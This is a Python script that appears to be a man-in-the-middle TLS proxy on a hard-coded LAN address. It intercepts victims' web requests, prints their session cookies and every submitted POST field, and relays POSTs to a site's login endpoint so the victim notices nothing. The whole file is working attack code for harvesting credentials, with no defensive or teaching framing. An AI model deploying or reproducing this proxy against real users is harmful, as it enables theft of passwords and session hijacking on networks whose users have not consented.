from socketserver import TCPServer, ThreadingMixIn, StreamRequestHandler
import ssl
import http.client
import os
import socket
import codecs
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import netifaces as ni
from scapy.all import *
import subprocess
from cgi import parse_header, parse_multipart
from urllib.parse import parse_qs
import http.client, urllib.parse


host_ip = "192.168.0.23"

class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        print('[*] GET', self.headers['Host'] + "/" + self.path)

        try:
            hs = {}
            for h in self.headers:
                if str(h) != 'Accept-Encoding':
                    hs[h] = self.headers[h]
            print("\t\tcookie: ", self.headers['Cookie'])
            print("\n")
            conn = http.client.HTTPSConnection(self.headers['Host'])
            conn.request("GET", self.path, headers=hs) # TODO check if headers are working
            r1 = conn.getresponse()
            #print(r1.status, r1.reason)
            data1 = r1.read()

            self.wfile.write(b'HTTP/1.1 200 OK')
            for h in r1.headers:
                if str(h) != 'Vary':
                    self.send_header(h, r1.headers[h])
            self.end_headers()
            self.wfile.write(data1)
        except Exception as e:
            print(e)


    def parse_POST(self):
        ctype, pdict = parse_header(self.headers['content-type'])
        if ctype == 'multipart/form-data':
            postvars = parse_multipart(self.rfile, pdict)
        elif ctype == 'application/x-www-form-urlencoded':
            length = int(self.headers['content-length'])
            postvars = parse_qs(
                self.rfile.read(length),
                keep_blank_values=1)
        else:
            postvars = {}
        return postvars

    def do_POST(self):
        print("[*] POST " + self.headers['Host'] + " " + self.path)
        tmp = self.parse_POST()
        postvars = {}

        print("\t\tcookie: ", self.headers['Cookie'])
        for v in tmp:
            postvars[v.decode('ascii')] = tmp[v][0].decode('ascii')
        params = urllib.parse.urlencode(postvars)

        print("\t\tPOST variables:")
        for v in postvars:
            print('\t\t\t', v, ": ", postvars[v])
        print("\n")
        hs = {}
        for h in self.headers:
            hs[h] = self.headers[h]
        conn = http.client.HTTPSConnection(self.headers['Host'])
        conn.request("POST", "/index.php?show=login", params, hs)  # TODO check if headers are working
        r1 = conn.getresponse()
        #print(r1.status, r1.reason)
        data1 = r1.read()  # This will return entire content.
        self.wfile.write(b'HTTP/1.1 200 OK')
        for h in r1.headers:
            self.send_header(h, r1.headers[h])
        self.end_headers()
        self.wfile.write(data1)



httpd = HTTPServer((host_ip, 4433), MyHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True, cert_reqs=ssl.CERT_OPTIONAL)
httpd.serve_forever()
